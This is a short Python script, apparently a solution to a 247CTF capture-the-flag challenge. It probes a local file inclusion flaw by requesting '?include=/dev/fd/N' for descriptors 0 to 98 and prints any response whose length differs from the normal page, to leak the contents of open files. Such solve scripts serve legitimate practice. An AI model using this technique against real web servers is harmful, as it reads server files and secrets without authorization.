import requests

normal_len=1974
for i in range(0, 99):
    response = requests.get('https://dfd002dc190aa3fd.247ctf.com/?include=/dev/fd/' + str(i))
    if(len(response.text) != 1974):
        print(response.text)